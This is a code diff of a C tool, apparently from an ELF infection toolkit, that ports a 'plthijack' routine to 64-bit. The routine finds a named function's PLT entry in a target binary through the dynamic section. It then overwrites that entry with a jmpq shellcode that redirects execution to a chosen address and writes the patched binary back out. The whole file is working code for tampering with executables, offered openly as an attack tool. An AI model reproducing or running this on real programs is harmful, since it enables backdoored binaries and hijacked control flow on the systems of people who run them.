@@ -2,20 +2,22 @@
 #include "headers.h"
 #include <errno.h>
 
-int plthijack(char *tfile, char *name, Elf32_Addr addr)
+#define PLTENTSZ 0x10
+
+int plthijack(char *tfile, char *name, Elf64_Addr addr)
 {
 	Elf64_Rela *relaplt;
 	Elf64_Sym *symtab;
-	Elf32_Off pltoff, funcoff;
-	Elf32_Addr tmpaddr;
+	Elf64_Addr pltaddr;
+	Elf64_Off tmpoff, pltoff;
 
 	elf64_t telf;
 
-	int fd, symndx, funcndx;
-	size_t relapltsz, pltsz, pltentsz;
+	int fd, funcndx;
+	size_t relapltsz;
 
 	uint8_t *plt;
-	char *shstrtab, *strtab;
+	char *strtab;
 	char shellcode[] = "\xe9\x00\x00\x00\x00";	// jmpq xxxx
 
 	if (load_elf(tfile, &telf) == -1)
@@ -24,31 +26,33 @@ int plthijack(char *tfile, char *name, Elf32_Addr addr)
 		return -1;									// -->
 	}
 
-	shstrtab = &telf.mem[telf.shdr[telf.ehdr->e_shstrndx].sh_offset];
-	printf("Searching .rela.plt section and .plt section...\n");
-	relaplt = NULL, plt = NULL;
-	for (int i = 0; i < telf.ehdr->e_shnum; i++)
+	printf("Searching .rela.plt section and linked symbol table and string table...\n");
+	relaplt = NULL;
+	for (int i = 0; telf.dyn[i].d_tag != DT_NULL; i++)
 	{
-		if (!strcmp(&shstrtab[telf.shdr[i].sh_name], ".rela.plt"))
+		switch (telf.dyn[i].d_tag)
 		{
-			relaplt = (Elf64_Rela *)&telf.mem[telf.shdr[i].sh_offset];
-			relapltsz = telf.shdr[i].sh_size;
-			symndx = telf.shdr[i].sh_link;
-			printf("%s .rela.plt section offset: 0x%08lx\n", GREEN("[+]"), telf.shdr[i].sh_offset);
-			printf("%s .rela.plt section address: 0x%08lx\n", GREEN("[+]"), telf.shdr[i].sh_addr);
-			printf("%s .rela.plt section size: %ldBytes\n", GREEN("[+]"), telf.shdr[i].sh_size);
-			printf("%s .rela.plt section linked symbol table index: %d\n", GREEN("[+]"), symndx);
-		}
-		else if (!strcmp(&shstrtab[telf.shdr[i].sh_name], ".plt"))
-		{
-			plt = &telf.mem[telf.shdr[i].sh_offset];
-			pltoff = telf.shdr[i].sh_offset;
-			pltentsz = telf.shdr[i].sh_entsize;
-			pltsz = telf.shdr[i].sh_size;
-			printf("%s .plt section offset: 0x%08lx\n", GREEN("[+]"), telf.shdr[i].sh_offset);
-			printf("%s .plt section address: 0x%08lx\n", GREEN("[+]"), telf.shdr[i].sh_addr);
-			printf("%s .plt section size: %ldBytes\n", GREEN("[+]"), pltsz);
-			printf("%s .plt section entry size: %ldBytes\n", GREEN("[+]"), pltentsz);
+		case DT_JMPREL:
+			/* Based on text segment */
+			tmpoff = telf.dyn[i].d_un.d_ptr - telf.textvaddr;
+			relaplt = (Elf64_Rela *)&telf.mem[tmpoff];
+			printf("%s .rela.plt section offset: 0x%08lx\n", GREEN("[+]"), tmpoff);
+			break;
+		case DT_PLTRELSZ:
+			relapltsz = telf.dyn[i].d_un.d_val;
+			break;
+		case DT_SYMTAB:
+			/* Based on text segment */
+			tmpoff = telf.dyn[i].d_un.d_ptr - telf.textvaddr;
+			symtab = (Elf64_Sym *)&telf.mem[tmpoff];
+			printf("%s .dynsym section offset: 0x%08lx\n", GREEN("[+]"), tmpoff);
+			break;
+		case DT_STRTAB:
+			/* Based on text segment */
+			tmpoff = telf.dyn[i].d_un.d_ptr - telf.textvaddr;
+			strtab = &telf.mem[tmpoff];
+			printf("%s .dynstr section offset: 0x%08lx\n", GREEN("[+]"), tmpoff);
+			break;
 		}
 	}
 
@@ -58,14 +62,6 @@ int plthijack(char *tfile, char *name, Elf32_Addr addr)
 		return -1;									// -->
 	}
 
-	if (plt == NULL)
-	{
-		fprintf(stderr, "%s .plt section not found\n", RED("[-]"));
-		return -1;									// -->
-	}
-
-	symtab = (Elf64_Sym *)&telf.mem[telf.shdr[symndx].sh_offset];
-	strtab = &telf.mem[telf.shdr[telf.shdr[symndx].sh_link].sh_offset];
 	printf("Searching function %s index in .rela.plt...\n", name);
 	funcndx = -1;
 	for (int i = 0; i < relapltsz / sizeof(Elf64_Rela); i++)
@@ -85,28 +81,18 @@ int plthijack(char *tfile, char *name, Elf32_Addr addr)
 	}
 
 	printf("Searching function %s plt code...\n", name);
-	tmpaddr = addr;
-	for (int i = 0; i < pltsz / pltentsz; i++)
-	{
-		funcoff = *(Elf32_Off *)&plt[2];
-		funcoff += (pltoff + 6);
-		if (relaplt[funcndx].r_offset == funcoff)
-		{
-			printf("%s Function %s plt code offset: %08x\n", GREEN("[+]"), name, pltoff);
-			addr -= (pltoff + sizeof(shellcode) - 1);
-			*(Elf32_Addr *)&shellcode[1] = addr;
-			memcpy(plt, shellcode, sizeof(shellcode) - 1);
-		}
-		plt += pltentsz;
-		pltoff += pltentsz;
-	}
+	/* Based on data segment */
+	pltaddr = *(Elf64_Addr *)&telf.mem[telf.dataoff + (relaplt[funcndx].r_offset - telf.datavaddr)];
+	/* Based on text segment */
+	pltoff = pltaddr - telf.textvaddr - 6;		// 6 is a length of jump instruction
+	plt = &telf.mem[pltoff];
+	printf("%s Function %s plt code offset: %08lx\n", GREEN("[+]"), name, pltoff);
 
-	if (addr == tmpaddr)
-	{
-		fprintf(stderr, "%s Function %s plt code not found\n", RED("[-]"), name);
-		return -1;									// -->
-	}
+	addr -= (pltoff + sizeof(shellcode) - 1);
+	*(Elf32_Addr *)&shellcode[1] = *(Elf32_Addr *)&addr;
+	memcpy(plt, shellcode, sizeof(shellcode) - 1);
 
+	/* Open file and write the changes */
 	if ((fd = open(TMP_FILE, O_CREAT | O_WRONLY, telf.mode)) < 0)
 	{
 		fprintf(stderr, "%s Open file %s failed\n", RED("[-]"), TMP_FILE);
@@ -135,7 +121,7 @@ int plthijack(char *tfile, char *name, Elf32_Addr addr)
 
 int main(int argc, char *argv[])
 {
-	Elf32_Addr addr;
+	Elf64_Addr addr;
 	char *endptr;
 
 	if (argc != 4)
@@ -157,6 +143,8 @@ int main(int argc, char *argv[])
 		fprintf(stderr, "%s PLT hijack failed\n", RED("[-]"));
 		exit(-1);									// -->
 	}
+
+	printf("\n%s\n", GREEN("Success!"));
 
 	return 0;
 }
